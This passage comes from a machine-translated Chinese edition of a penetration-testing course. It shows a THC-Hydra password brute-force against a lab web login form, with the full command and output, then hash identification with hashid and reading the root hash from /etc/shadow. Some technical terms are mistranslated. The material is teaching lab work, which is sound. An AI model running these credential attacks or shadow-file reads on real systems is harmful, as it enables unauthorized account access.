<div style="position:absolute;top:169850;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/form/frontpage.php:user=admin&amp;pass=^PASS^ </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，其中</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^PASS^</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为我们的占位符</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:169869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">词表文件条目。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:170059;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="144"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 144 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:170092;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:171169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:171169;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:171169;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">585</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:170188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还必须提供</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条件字符串</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以指示登录尝试何时不成功。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:170207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过尝试一些手动登录尝试找到。</font><font style="vertical-align: inherit;">在我们的示例中，网页返回</font></font></nobr></div>
<div style="position:absolute;top:170226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文本“INVALID LOGIN”如图295所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:170448;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 295：使用无效登录凭据的响应</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:170479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将这些部分放在一起，我们可以完成清单 611 中给出的 http-form-post 语法。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:170514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http-form-post "/form/frontpage.php:user=admin&amp;pass=^PASS^:INVALID LOGIN"</font></font></nobr></div>
<div style="position:absolute;top:170533;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 611 - 指定 http-form-post 语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:170563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在可以执行完整的命令。</font><font style="vertical-align: inherit;">我们将提供管理员用户名 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l admin</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:170582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 wordlist ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-P</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-vV</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求详细输出</font><font style="vertical-align: inherit;">，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止攻击</font></font></nobr></div>
<div style="position:absolute;top:170601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到成功的结果。</font><font style="vertical-align: inherit;">此外，我们将提供服务模块名称（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http-form-post</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></nobr></div>
<div style="position:absolute;top:170621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">及其所需的参数（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“/form/frontpage.php:user=admin&amp;pass=^PASS^:INVALID</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:170641;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LOGIN” </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），如清单 612 所示：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:170675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&amp;pass=^PAS</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:170692;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:170709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hydra v8.8 (c) 2019 by van Hauser/THC - 请不要在军事或秘密服务中使用</font></font></nobr></div>
<div style="position:absolute;top:170743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hydra (https://github.com/vanhauser-thc/thc-hydra) 2019-06-07 15:55:21 开始</font></font></nobr></div>
<div style="position:absolute;top:170760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[数据] 每 1 个服务器最多 16 个任务，总共 16 个任务，14344399 次登录尝试 (l:1/p:143443</font></font></nobr></div>
<div style="position:absolute;top:170777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DATA] 攻击 http-post-form://10.11.0.22/form/frontpage.php:user=admin&amp;pass=^PASS^</font></font></nobr></div>
<div style="position:absolute;top:170794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：登录无效</font></font></nobr></div>
<div style="position:absolute;top:170811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[VERBOSE] 正在解析地址... [VERBOSE] 解析完成</font></font></nobr></div>
<div style="position:absolute;top:170828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“123456” - 1 of 14344399 [child 0] </font></font></nobr></div>
<div style="position:absolute;top:170845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“12345” - 2 of 14344399 [child 1] (</font></font></nobr></div>
<div style="position:absolute;top:170862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“123456789” - 3 of 14344399 [child </font></font></nobr></div>
<div style="position:absolute;top:170879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 传递“密码” - 4 of 14344399 [child 3</font></font></nobr></div>
<div style="position:absolute;top:170896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“iloveyou” - 5 of 14344399 [child 4</font></font></nobr></div>
<div style="position:absolute;top:170913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“princess” - 6 of 14344399 [child 5</font></font></nobr></div>
<div style="position:absolute;top:170930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“1234567” - 7 of 14344399 [child 6]</font></font></nobr></div>
<div style="position:absolute;top:170947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.....</font></font></nobr></div>
<div style="position:absolute;top:170964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“karina” - 268 of 14344399 [child 1</font></font></nobr></div>
<div style="position:absolute;top:170981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 传递“dookie” - 269 of 14344399 [child 1</font></font></nobr></div>
<div style="position:absolute;top:170998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“hotmail” - 270 of 14344399 [child </font></font></nobr></div>
<div style="position:absolute;top:171015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[尝试] 目标 10.11.0.22 - 登录“admin” - 通过“0123456789” - 271 of 14344399 [chi</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:171032;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[80][http-post-form] 主机：10.11.0.22 登录名：admin 密码：crystal</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:171049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[STATUS] 攻击在 10.11.0.22 完成（找到有效对）</font></font></nobr></div>
<div style="position:absolute;top:171066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 个目标中的 1 个成功完成，找到 1 个有效密码</font></font></nobr></div>
<div style="position:absolute;top:171082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hydra (https://github.com/vanhauser-thc/thc-hydra) 完成于 2019-06-07 15:55:29</font></font></nobr></div>
<div style="position:absolute;top:171102;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 612 - 使用 THC-Hydra 攻击 Web 表单 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:171247;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="145"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 145 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:171280;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:172357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:172357;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:172357;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">586</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这需要对应用程序进行一些调查，但结果是值得的</font></font></nobr></div>
<div style="position:absolute;top:171395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码被发现。</font><font style="vertical-align: inherit;">Hydra 中包含的其他服务模块非常值得付出努力</font></font></nobr></div>
<div style="position:absolute;top:171414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">掌握。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:171449;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171483;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:171516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 对 Windows 客户端上的 Web 表单运行 HTTP POST 密码攻击。</font></font></nobr></div>
<div style="position:absolute;top:171545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 对本地 Kali Linux 上的 Pure-FTPd 应用程序执行 FTP 密码攻击</font></font></nobr></div>
<div style="position:absolute;top:171564;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:171601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4 利用密码哈希</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将注意力转向使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码哈希的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:171676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">散列函数</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">562</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是实现算法的单向函数，该算法给定一个</font></font></nobr></div>
<div style="position:absolute;top:171695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任意数据块，返回一个固定大小的位串，称为“散列值”或“消息摘要”。</font><font style="vertical-align: inherit;">一</font></font></nobr></div>
<div style="position:absolute;top:171714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码散列函数最重要的用途之一是它们在密码中的应用</font></font></nobr></div>
<div style="position:absolute;top:171734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确认。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:171768;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.1</font></font></i></nobr></div>
<div style="position:absolute;top:171768;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检索密码哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数使用密码认证机制的系统都需要存储这些密码</font></font></nobr></div>
<div style="position:absolute;top:171825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在机器本地。</font><font style="vertical-align: inherit;">现代身份验证不是以明文形式存储密码</font></font></nobr></div>
<div style="position:absolute;top:171845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机制通常将它们存储为哈希以提高安全性。</font><font style="vertical-align: inherit;">这对于操作系统来说是正确的，</font></font></nobr></div>
<div style="position:absolute;top:171864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络硬件等等。</font><font style="vertical-align: inherit;">这意味着在认证过程中，密码</font></font></nobr></div>
<div style="position:absolute;top:171883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户提供的信息经过哈希处理并与之前存储的消息摘要进行比较。</font></font></nobr></div>
<div style="position:absolute;top:171916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在没有关于程序的更多信息的情况下识别哈希的确切类型或</font></font></nobr></div>
<div style="position:absolute;top:171936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">产生它的机制可能非常具有挑战性，有时甚至是不可能的。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:171955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Openwall 网站</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">563</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以帮助识别各种密码哈希的来源。</font><font style="vertical-align: inherit;">当试图</font></font></nobr></div>
<div style="position:absolute;top:171974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">识别消息摘要类型，需要考虑三个重要的散列属性。</font><font style="vertical-align: inherit;">这些包括</font></font></nobr></div>
<div style="position:absolute;top:171994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">散列的长度、散列中使用的字符集以及散列中使用的任何特殊字符</font></font></nobr></div>
<div style="position:absolute;top:172013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希。</font></font></nobr></div>
<div style="position:absolute;top:172046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以帮助识别哈希类型的有用工具是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hashid</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">564</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用它，我们只需运行</font></font></nobr></div>
<div style="position:absolute;top:172065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具并粘贴到我们希望识别的哈希中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:172100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hashid c43ee559d69bc7f691fe2fbfe8a5ef0a</font></font></font></b></nobr></div>
<div style="position:absolute;top:172117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析'c43ee559d69bc7f691fe2fbfe8a5ef0a'</font></font></nobr></div>
<div style="position:absolute;top:172134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] MD2</font></font></nobr></div>
<div style="position:absolute;top:172151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] MD5</font></font></nobr></div>
<div style="position:absolute;top:172168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] MD4</font></font></nobr></div>
<div style="position:absolute;top:172185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 双 MD5</font></font></nobr></div>
<div style="position:absolute;top:172202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] LM</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:172267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">562 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cryptographic_hash_function</font></font></font></nobr></div>
<div style="position:absolute;top:172287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">563 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Openwall，2019 年），http://openwall.info/wiki/john/sample-hashes</font></font></font></nobr></div>
<div style="position:absolute;top:172307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">564 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Psypanda，2015），https://psypanda.github.io/hashID/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:172435;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="146"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 146 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:172468;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:173545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:173545;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:173545;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">587</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:172564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] RIPEMD-128</font></font></nobr></div>
<div style="position:absolute;top:172580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 哈弗-128</font></font></nobr></div>
<div style="position:absolute;top:172597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] Tiger-128</font></font></nobr></div>
<div style="position:absolute;top:172614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 绞纱-256(128)</font></font></nobr></div>
<div style="position:absolute;top:172632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 绞纱-512(128)</font></font></nobr></div>
<div style="position:absolute;top:172648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] Lotus Notes/Domino 5</font></font></nobr></div>
<div style="position:absolute;top:172665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] Skype</font></font></nobr></div>
<div style="position:absolute;top:172682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] Snefru-128</font></font></nobr></div>
<div style="position:absolute;top:172699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] NTLM</font></font></nobr></div>
<div style="position:absolute;top:172716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 域缓存凭据</font></font></nobr></div>
<div style="position:absolute;top:172733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 域缓存凭据 2</font></font></nobr></div>
<div style="position:absolute;top:172750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] DNSSEC(NSEC3)</font></font></nobr></div>
<div style="position:absolute;top:172767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] RAdmin v2.x</font></font></nobr></div>
<div style="position:absolute;top:172801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:172818;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:172835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析 '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G</font></font></nobr></div>
<div style="position:absolute;top:172852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:172869;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] SHA-512 地穴</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:172888;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 613 - 使用 hashid 识别可能的哈希格式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:172918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的清单中，我们分析了两种不同的哈希值。</font><font style="vertical-align: inherit;">虽然第一个例子返回了多个</font></font></nobr></div>
<div style="position:absolute;top:172937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能的匹配，第二个将哈希类型缩小到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SHA-512 Crypt</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:172970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们在 Kali Linux 系统上检索和分析一些哈希值。</font><font style="vertical-align: inherit;">许多 Linux 系统都有</font></font></nobr></div>
<div style="position:absolute;top:172989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在 /etc/shadow 文件中的用户密码哈希值，需要 root 权限才能读取：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:173024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo grep root /etc/shadow</font></font></font></b></nobr></div>
<div style="position:absolute;top:173041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根：$6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaU</font></font></nobr></div>
<div style="position:absolute;top:173058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cLaWtP/gewQkO7jT/:17564:0:99999:7:::</font></font></nobr></div>
<div style="position:absolute;top:173077;left:258"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 614 - 从我们的 Kali Linux /etc/shadow 文件中获取的 root 用户哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:173107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 614 中，该行以用户名 (root) 开头，后跟密码哈希。</font><font style="vertical-align: inherit;">哈希是</font></font></nobr></div>
<div style="position:absolute;top:173126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分为子字段，其中第一个 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$6</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 引用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SHA-512 </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">565</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">算法。</font><font style="vertical-align: inherit;">下一个子</font></font></nobr></div>
<div style="position:absolute;top:173146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">salt</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">566</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与明文密码一起使用以创建密码哈希。</font></font></nobr></div>
